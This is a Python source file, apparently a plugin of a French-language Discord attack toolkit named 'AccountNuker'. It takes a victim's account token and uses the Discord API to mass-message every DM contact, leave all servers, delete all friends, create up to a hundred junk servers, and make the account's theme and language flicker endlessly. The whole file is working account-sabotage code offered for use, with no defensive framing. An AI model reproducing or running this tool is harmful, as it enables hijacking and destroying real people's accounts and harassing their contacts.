from assets.plugin.common.base import *

def accnuke():

    rpc("AccountNuker")
    clear()
    Accnuke_banner()
    usertoken = input(f"""{y}[{b}#{y}]{w}Entre le token du compte que tu veux détruire:\n>>>""")
    
    def nuke(usertoken, Server_Name, message_Content):
        if active_count() <= 100:
            t = Thread(target=CustomSeizure, args=(usertoken, ))
            t.start()

        headers = {'Authorization': usertoken}
        channelIds = get("https://discord.com/api/v9/users/@me/channels", headers={'Authorization': usertoken}).json()
        print(f"\n\n{y}[{b}LOG{y}]{w}Envoie d'un message dans l'integralité des DM du compte...")
        for channel in channelIds:
            for x in range(int(mp_number)):
                try:
                    post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages', 
                    headers=headers,
                    data={"content": f"{message_Content}"})
                    time_print(f"{y}[{b}LOG{y}]{w}ID du message: {channel['id']} #{x}")
                except:
                    error("Erreur inconnue")

        print(f"\n\n{y}[{b}LOG{y}]{w}Tous les serveurs sont en train d'être supprimés...")
        guildsIds = get("https://discord.com/api/v7/users/@me/guilds", headers={'Authorization': usertoken}).json()
        for guild in guildsIds:
            try:
                delete(
                    f"https://discord.com/api/v7/users/@me/guilds/{guild['id']}",
                    headers={'Authorization': usertoken})
                time_print(f"{y}[{b}LOG{y}]{w}Serveur quitté: {guild['name']}")
            except:
                error("Erreur inconnue")

 
        print(f"\n\n{y}[{b}LOG{y}]{w}Tous les amis sont en train d'être supprimées...")
        friendIds = get("https://discord.com/api/v9/users/@me/relationships", headers={'Authorization': usertoken}).json()
        for friend in friendIds:
            try:
                delete(
                    f"https://discord.com/api/v9/users/@me/relationships/{friend['id']}", headers={'Authorization': usertoken})
                time_print(f"{y}[{b}LOG{y}]{w}Amis Supprimés: {friend['user']['username']}#{friend['user']['discriminator']}")
            except:
                error("Erreur inconnue")

        print(f"\n\n{y}[{b}LOG{y}]{w}Quelques serveurs sont en cours de création...")
        for i in range(100):
            try:
                payload = {'name': f'{Server_Name}', 'region': 'europe', 'icon': None, 'channels': None}
                post('https://discord.com/api/v7/guilds', headers={'Authorization': usertoken}, json=payload)
                time_print(f"{y}[{b}LOG{y}]{w}Serveur: {Server_Name} #{i}")
            except Exception as e:
                error("Erreur inconnue")

        t.do_run = False
        setting = {
              'theme': "light",
              'locale': "ja",
              'message_display_compact': False,
              'inline_embed_media': False,
              'inline_attachment_media': False,
              'gif_auto_play': False,
              'render_embeds': False,
              'render_reactions': False,
              'animate_emoji': False,
              'convert_emoticons': False,
              'enable_tts_command': False,
              'explicit_content_filter': '0',
              'status': "idle"
        }
        patch("https://discord.com/api/v7/users/@me/settings", headers={'Authorization': usertoken}, json=setting)
        j = get("https://discordapp.com/api/v9/users/@me", headers={'Authorization': usertoken}).json()
        a = f"{j['username']}#{j['discriminator']}"
        clear()
        Accnuke_banner()
        input(f"\n\n{y}[{b}#{y}]{w}Le compte est officiellement DCD... Appuie sur entrée pour quitter")
        
    def CustomSeizure(token):
        print(f"\n{y}[{b}LOG{y}]{w}Démarage du light/dark mode...")
        t = currentThread()
        while getattr(t, "do_run", True):
            modes = cycle(["light", "dark"])
            setting = {'theme': next(modes), 'locale': choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
            patch("https://discord.com/api/v7/users/@me/settings", headers={'Authorization': usertoken}, json=setting)
    
    clear()
    Accnuke_banner()
    Server_Name = input(f"{y}[{b}#{y}]{w}Entre le nom des serveurs qui vont être crées:\n>>>")
    clear()
    Accnuke_banner()
    Server_count = input(f"{y}[{b}#{y}]{w}Entre le nombre de serveurs qui vont être crées:\n>>>")
    clear()
    Accnuke_banner()
    global mp_number
    mp_number = input(f"{y}[{b}#{y}]{w}Entre le nombre de DM que tu veux envoyer:\n>>>")
    clear()
    Accnuke_banner()
    message_Content = input(f"{y}[{b}#{y}]{w}Entre le message que tu veux envoyer dans l'integralité des DM du compte:\n>>>")
    r = get('https://discord.com/api/v9/users/@me', headers={'Authorization': usertoken})
    threads = int(Server_count)

    if active_count()   < threads:
        Thread(target=nuke, args=(usertoken, Server_Name, message_Content)).start()
        return
